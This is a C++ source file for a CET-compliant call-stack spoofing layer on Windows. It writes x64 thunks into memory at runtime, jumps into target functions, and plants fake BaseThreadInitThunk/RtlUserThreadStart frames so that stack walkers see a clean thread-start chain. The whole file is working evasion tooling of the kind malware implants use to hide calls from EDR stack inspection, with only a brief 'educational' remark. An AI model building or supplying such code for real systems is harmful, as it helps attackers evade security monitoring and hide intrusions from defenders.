// Stack spoofing layer - CET / shadow-stack compliant implementation
//
// Classic stack spoofers overwrite a return address on the stack with a fake
// one (e.g. SilentMoonwalk "desync" mode). Under Intel CET shadow stacks that
// faults: every RET pops the regular stack AND the hardware shadow stack and
// the CPU compares them - a tampered return address that a RET actually
// consumes raises #CP.
//
// This layer stays CET-compliant by construction:
//   * the target is entered with JMP, not CALL, so no new shadow-stack entry
//     is created;
//   * the return slot the target's RET consumes holds a GENUINE address that
//     a real CALL pushed moments earlier, so regular and shadow stacks stay
//     in sync (2 calls, 2 rets, all genuine - nothing is ever patched);
//   * while the target runs, RSP still points inside the thread's own stack
//     (a synthetic frame carved below the live frames, _chkstk-style probing
//     keeps it committed), so stack walkers that validate RSP against the
//     TEB accept it. The frame is seeded with the canonical thread-start
//     chain (kernel32!BaseThreadInitThunk, ntdll!RtlUserThreadStart). Those
//     addresses are only ever *read* by walkers, never RETed through, so
//     CET does not care about them.
//
// Per-target thunk (up to 12 args), entered by an indirect call:
//
//   entry:  endbr64                        ; IBT landing pad for `call reg`
//           call  body                     ; pushes genuine R_fix (real+shadow)
//   fix:    mov   rsp, [rip+slot]          ; <- target's RET lands here
//           ret                            ; consumes genuine caller address
//   body:   mov   rax, [rsp]               ; rax = R_fix (pushed by `call body`)
//           lea   r11, [rsp+8]             ; r11 = &caller's return address
//           mov   [rip+slot], r11          ; save for the fix stub
//           push  rcx / push r9            ; preserve arg regs across probing
//           mov   r10, rsp
//           sub   r10, FRAME_SIZE          ; synthetic frame on the real stack
//           and   r10, -16
//           mov   r9, rsp                  ; grow the stack down to the frame
//   probe:  sub   r9, 0x1000               ; (_chkstk semantics: touching the
//           mov   cl, [r9]                 ;  guard page commits it)
//           cmp   r9, r10
//           ja    probe
//           pop   r9 / pop rcx
//           or    r10, 8                   ; entry alignment: rsp % 16 == 8
//           mov   rsp, r10                 ; switch to the synthetic frame
//           mov   [rsp], rax               ; slot the target's RET consumes:
//                                          ; genuine R_fix == shadow stack top
//           mov   rax, <kernel32!BaseThreadInitThunk+0x14>
//           mov   [rsp+8], rax             ; first synthetic caller frame
//           mov   rax, <ntdll!RtlUserThreadStart+0x21>
//           mov   [rsp+chain1_off], rax    ; second synthetic caller frame
//           zero  [rsp+chain1_off+8 .. +0x60] ; walks that continue past the
//                                          ; chain read a 0 return and stop
//           mov   r10, [r11+0x28+8i]       ; copy caller's tail args (only the
//           mov   [rsp+0x28+8i], r10       ; ones the target really takes)
//           mov   r11, <target>
//           jmp   r11                      ; JMP: no new shadow-stack entry
//
// Shadow-stack accounting: the caller's indirect call pushes R_caller,
// `call body` pushes R_fix. The target's RET consumes the R_fix copy (match),
// `fix`'s RET consumes R_caller (match). No pushed return address is ever
// overwritten, so the CPU never raises #CP.
#include "spoof.h"
#include <cstring>

static const DWORD WRAPPER_STRIDE = 0xE0;
static const DWORD FRAME_SIZE = 0x1000;     // synthetic frame depth below live rsp

static PVOID g_code_page = nullptr;   // wrappers + syscall stubs (RX after finalize)
static PVOID g_slot_page = nullptr;   // per-wrapper RSP save slots (RW)
static DWORD g_off = 0;
static DWORD g_slot_off = 0;
static uintptr_t g_chain0 = 0;        // kernel32!BaseThreadInitThunk+0x14
static uintptr_t g_chain1 = 0;        // ntdll!RtlUserThreadStart+0x21
static DWORD g_chain1_off = 0x38;     // slot for chain1, computed from unwind info

// Displacement that RtlVirtualUnwind will add to RSP when unwinding `pc`
// (inside a backed function), measured empirically with a scratch context.
// This tells us exactly which stack slot the next "return address" is read
// from on this Windows build, instead of hardcoding frame sizes.
static int unwind_rsp_delta(uintptr_t pc) {
    typedef PRUNTIME_FUNCTION(NTAPI* Rlfe)(DWORD64, PDWORD64, PVOID);
    typedef PVOID(NTAPI* Rvu)(DWORD, DWORD64, DWORD64, PRUNTIME_FUNCTION,
                              PCONTEXT, PVOID*, PDWORD64, PVOID);
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    static Rlfe lookup = (Rlfe)GetProcAddress(nt, "RtlLookupFunctionEntry");
    static Rvu vunwind = (Rvu)GetProcAddress(nt, "RtlVirtualUnwind");
    if (!lookup || !vunwind) return -1;

    DWORD64 base = 0;
    PRUNTIME_FUNCTION fe = lookup(pc, &base, nullptr);
    if (!fe) return 8; // leaf function: caller rsp = rsp + 8

    BYTE buf[0x400];
    memset(buf, 0, sizeof(buf));
    uintptr_t mid = (uintptr_t)buf + 0x200;
    CONTEXT c{};
    c.ContextFlags = CONTEXT_FULL;
    c.Rip = pc;
    c.Rsp = mid;
    // point every non-volatile at the scratch buffer so frame-register based
    // unwinds read zeros instead of faulting
    c.Rbx = c.Rbp = c.Rdi = c.Rsi = mid;
    c.R8 = c.R9 = c.R10 = c.R11 = mid;
    c.R12 = c.R13 = c.R14 = c.R15 = mid;
    PVOID h = nullptr;
    DWORD64 est = 0;
    vunwind(0, base, pc, fe, &c, &h, &est, nullptr);
    long long d = (long long)(c.Rsp - mid);
    if (d < 8 || d > 0x60) return -1;
    return (int)d;
}

namespace spoof {

bool init() {
    if (g_code_page) return true;

    g_off = 0;
    g_slot_off = 0;

    // canonical thread-start chain (educational approximation; the +0x14/+0x21
    // offsets point just past call instructions and are build-dependent)
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    PVOID bit = k32 ? (PVOID)GetProcAddress(k32, "BaseThreadInitThunk") : nullptr;
    PVOID ruts = nt ? (PVOID)GetProcAddress(nt, "RtlUserThreadStart") : nullptr;
    if (bit) g_chain0 = (uintptr_t)bit + 0x14;
    if (ruts) g_chain1 = (uintptr_t)ruts + 0x21;
    if (!g_chain0) g_chain0 = g_chain1;
    if (!g_chain1) g_chain1 = g_chain0;
    if (!g_chain0) return false;

    // compute the exact synthetic slot from unwind info where possible:
    // after the fix-stub leaf frame the walker's rsp is SF+0x10, then the
    // frame's return address is read at [rsp + delta - 8]
    int d0 = g_chain0 ? unwind_rsp_delta(g_chain0) : -1;
    if (d0 > 0) g_chain1_off = 0x10 + (DWORD)d0 - 8;
    if (g_chain1_off > 0x70) g_chain1_off = 0x38; // keep disp8-encodable

    // one reservation for code+slot pages so rip-relative disp32 always
    // reaches the slot page
    BYTE* r = (BYTE*)VirtualAlloc(nullptr, 0x2000, MEM_RESERVE, PAGE_NOACCESS);
    if (!r) return false;
    g_code_page  = VirtualAlloc(r,         0x1000, MEM_COMMIT, PAGE_READWRITE);
    g_slot_page  = VirtualAlloc(r + 0x1000, 0x1000, MEM_COMMIT, PAGE_READWRITE);
    if (g_code_page && g_slot_page) return true;

    VirtualFree(r, 0, MEM_RELEASE);
    g_code_page = nullptr;
    g_slot_page = nullptr;
    return false;
}

PVOID carve_code(size_t n) {
    if (!g_code_page) return nullptr;
    size_t need = (n + 15) & ~(size_t)15;
    if (g_off + need > 0x1000) return nullptr;
    PVOID p = (BYTE*)g_code_page + g_off;
    g_off += (DWORD)need;
    return p;
}

PVOID carve_rw(size_t n) {
    if (!g_slot_page) return nullptr;
    size_t need = (n + 7) & ~(size_t)7;
    if (g_slot_off + need > 0x1000) return nullptr;
    PVOID p = (BYTE*)g_slot_page + g_slot_off;
    g_slot_off += (DWORD)need;
    return p;
}

PVOID build_wrapper(PVOID target, DWORD tail_args) {
    if (!g_code_page || g_off + WRAPPER_STRIDE > 0x1000) return nullptr;
    if (tail_args > 8) tail_args = 8;

    // chain slots inside the copied tail-arg area would be clobbered by (or
    // corrupt) real arguments - skip them there
    DWORD arg_end = 0x28 + tail_args * 8;
    bool store_chain1 = g_chain1_off < 0x28 || g_chain1_off >= arg_end;

    BYTE* p = (BYTE*)g_code_page + g_off;
    BYTE* slot = (BYTE*)g_slot_page + g_off;
    DWORD disp_fix  = (DWORD)(slot - (p + 0x10));  // `mov rsp,[rip+d]` at +0x09
    DWORD disp_body = (DWORD)(slot - (p + 0x21));  // `mov [rip+d],r11` at +0x1A

    BYTE code[0xD8] = {0};
    DWORD o = 0;
    code[o + 0] = 0xF3; code[o + 1] = 0x0F; code[o + 2] = 0x1E; code[o + 3] = 0xFA; // endbr64
    code[o + 4] = 0xE8; *(DWORD*)(code + o + 5) = 8;      // call body (+0x11)
    o += 9;
    // fix: the target's RET lands here
    code[o + 0] = 0x48; code[o + 1] = 0x8B; code[o + 2] = 0x25; // mov rsp, [rip+disp]
    *(DWORD*)(code + o + 3) = disp_fix;
    code[o + 7] = 0xC3;                                         // ret
    o += 8;
    // body
    code[o + 0] = 0x48; code[o + 1] = 0x8B; code[o + 2] = 0x04; code[o + 3] = 0x24; // mov rax, [rsp]
    o += 4;
    code[o + 0] = 0x4C; code[o + 1] = 0x8D; code[o + 2] = 0x5C; code[o + 3] = 0x24;
    code[o + 4] = 0x08;                                         // lea r11, [rsp+8]
    o += 5;
    code[o + 0] = 0x4C; code[o + 1] = 0x89; code[o + 2] = 0x1D; // mov [rip+disp], r11
    *(DWORD*)(code + o + 3) = disp_body;
    o += 7;
    code[o + 0] = 0x51;                                         // push rcx
    o += 1;
    code[o + 0] = 0x41; code[o + 1] = 0x51;                     // push r9
    o += 2;
    code[o + 0] = 0x4C; code[o + 1] = 0x8B; code[o + 2] = 0xD4; // mov r10, rsp
    o += 3;
    code[o + 0] = 0x49; code[o + 1] = 0x81; code[o + 2] = 0xEA; // sub r10, FRAME_SIZE
    *(DWORD*)(code + o + 3) = FRAME_SIZE;
    o += 7;
    code[o + 0] = 0x49; code[o + 1] = 0x83; code[o + 2] = 0xE2; code[o + 3] = 0xF0; // and r10, -16
    o += 4;
    code[o + 0] = 0x4C; code[o + 1] = 0x8B; code[o + 2] = 0xCC; // mov r9, rsp
    o += 3;
    DWORD probe = o;                                            // probe loop
    code[o + 0] = 0x49; code[o + 1] = 0x81; code[o + 2] = 0xE9; // sub r9, 0x1000
    *(DWORD*)(code + o + 3) = 0x1000;
    o += 7;
    code[o + 0] = 0x41; code[o + 1] = 0x8A; code[o + 2] = 0x09; // mov cl, [r9]
    o += 3;
    code[o + 0] = 0x4D; code[o + 1] = 0x39; code[o + 2] = 0xD1; // cmp r9, r10
    o += 3;
    code[o + 0] = 0x77;                                         // ja probe
    code[o + 1] = (BYTE)(probe - (o + 2));
    o += 2;
    code[o + 0] = 0x41; code[o + 1] = 0x59;                     // pop r9
    o += 2;
    code[o + 0] = 0x59;                                         // pop rcx
    o += 1;
    code[o + 0] = 0x49; code[o + 1] = 0x83; code[o + 2] = 0xCA; code[o + 3] = 0x08; // or r10, 8
    o += 4;
    code[o + 0] = 0x4C; code[o + 1] = 0x89; code[o + 2] = 0xD4; // mov rsp, r10
    o += 3;
    code[o + 0] = 0x48; code[o + 1] = 0x89; code[o + 2] = 0x04; code[o + 3] = 0x24; // mov [rsp], rax
    o += 4;
    code[o + 0] = 0x48; code[o + 1] = 0xB8;                     // mov rax, imm64
    *(uintptr_t*)(code + o + 2) = g_chain0;
    o += 10;
    code[o + 0] = 0x48; code[o + 1] = 0x89; code[o + 2] = 0x44; code[o + 3] = 0x24;
    code[o + 4] = 0x08;                                         // mov [rsp+8], rax
    o += 5;
    if (store_chain1) {
        code[o + 0] = 0x48; code[o + 1] = 0xB8;                 // mov rax, imm64
        *(uintptr_t*)(code + o + 2) = g_chain1;
        o += 10;
        code[o + 0] = 0x48; code[o + 1] = 0x89; code[o + 2] = 0x44; code[o + 3] = 0x24;
        code[o + 4] = (BYTE)g_chain1_off;                       // mov [rsp+chain1_off], rax
        o += 5;
    }
    // zero the slots above the chain so any further unwind reads a 0 return
    // address and the walk terminates cleanly
    {
        DWORD start = g_chain1_off + 8;                         // first zeroed slot
        DWORD count = 12;                                       // cover ~0x60 above it
        code[o + 0] = 0x31; code[o + 1] = 0xC0;                 // xor eax, eax
        o += 2;
        code[o + 0] = 0x41; code[o + 1] = 0xBA;                 // mov r10d, count
        *(DWORD*)(code + o + 2) = count;
        o += 6;
        DWORD zloop = o;
        code[o + 0] = 0x4A; code[o + 1] = 0x89;                 // mov [rsp+r10*8+disp], rax
        code[o + 2] = 0x44; code[o + 3] = 0xD4;
        code[o + 4] = (BYTE)(start - 8);
        o += 5;
        code[o + 0] = 0x49; code[o + 1] = 0xFF; code[o + 2] = 0xCA; // dec r10
        o += 3;
        code[o + 0] = 0x75;                                     // jnz zloop
        code[o + 1] = (BYTE)(zloop - (o + 2));
        o += 2;
    }
    for (DWORD i = 0; i < tail_args; i++) {                     // copy the tail args
        code[o + 0] = 0x4D; code[o + 1] = 0x8B;                 // mov r10, [r11+disp8]
        code[o + 2] = 0x53;
        code[o + 3] = (BYTE)(0x28 + i * 8);
        code[o + 4] = 0x4C; code[o + 5] = 0x89;                 // mov [rsp+disp8], r10
        code[o + 6] = 0x54; code[o + 7] = 0x24;
        code[o + 8] = (BYTE)(0x28 + i * 8);
        o += 9;
    }
    code[o + 0] = 0x49; code[o + 1] = 0xBB;                     // mov r11, imm64
    *(uintptr_t*)(code + o + 2) = (uintptr_t)target;
    o += 10;
    code[o + 0] = 0x41; code[o + 1] = 0xFF; code[o + 2] = 0xE3; // jmp r11
    o += 3;                                                     // o <= 0xD7

    memcpy(p, code, o);
    g_off += WRAPPER_STRIDE;
    return p;
}

bool finalize() {
    if (!g_code_page) return false;
    DWORD old = 0;
    if (!VirtualProtect(g_code_page, 0x1000, PAGE_EXECUTE_READ, &old)) return false;
    return FlushInstructionCache(GetCurrentProcess(), g_code_page, 0x1000) != FALSE;
}

bool cet_shadow_stack_enabled() {
    // resolved dynamically to stay SDK-agnostic
    typedef BOOL(WINAPI* Gpmp)(HANDLE, int, PVOID, SIZE_T);
    static Gpmp gpmp = (Gpmp)GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                            "GetProcessMitigationPolicy");
    if (!gpmp) return false;
    // ProcessUserShadowStackPolicy = 15; policy struct is one DWORD of flags
    DWORD flags = 0;
    if (!gpmp(GetCurrentProcess(), 15, &flags, sizeof(flags)))
        return false;
    return (flags & 1) != 0; // EnableUserShadowStack
}

} // namespace spoof
